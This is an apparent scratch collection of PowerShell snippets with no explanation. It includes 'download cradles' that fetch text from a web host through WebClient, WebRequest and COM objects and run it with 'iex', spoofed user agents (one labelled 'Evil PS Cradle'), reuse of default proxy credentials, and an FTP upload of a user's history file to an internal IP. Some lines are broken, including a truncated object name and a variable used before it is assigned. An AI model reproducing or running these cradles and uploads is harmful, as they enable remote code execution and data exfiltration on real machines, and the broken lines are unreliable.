$webClient = New-Object System.Net.WebClient
$webClient.Headers.Add("user-agent", 
    "Windows-RSS-Platform/2.0 (MSIE 9.0; Windows NT 6.1)")

$proxy = [System.Net.WebRequest]::GetSystemWebProxy()
$proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials
$webClient.Proxy = $proxy

$webClient.UploadFile("ftp://192.168.1.152/bashhistory.txt", "C:\Users\Carlos\bashhistory.txt")

$h=New-Object -ComObject Msxml2.XMLHTTP;$h.open('GET','http://www.tenable.com',$false);$h.send();

$obj = New-Object -ComObject Microsoft.XMLHTTP


$proxy = [System.Net.WebRequest]::GetSystemWebProxy()

$proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials

 $webRequest.Proxy = $proxy

$webRequest = [System.Net.WebRequest]::Create("http://www.tenable.com")
$webRequest.UserAgent = "Windows-RSS-Platform/2.0 (MSIE 9.0; Windows NT 6.1)"
$response = $webRequest.GetResponse()
([System.IO.StreamReader]($response.GetResponseStream())).ReadToEnd()




$h=new-object -com WinHttp.WinHttpRequest.5.1;
$h=New-Object -ComObject Msxml2.XMLHTT
$h=New-Object -ComObject Microsoft.XMLHTTP
$h.open("GET", "http://www.tenable.com",$false)
# User Agent can be modified.
$h.SetRequestHeader("User-Agent", "Evil PS Cradle")
$h.send()
iex $h.responseText

"Mozilla/4.0 (compatible; Win32; WinHttp.WinHttpRequest.5)"
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; Win64; x64; Trident/7.0; .NET4.0C; .NET4.0E; .NET CLR 2.0.50727; .NET CLR 3.0.30729; .NET CLR 3.5.30729; Tablet PC 2.0)"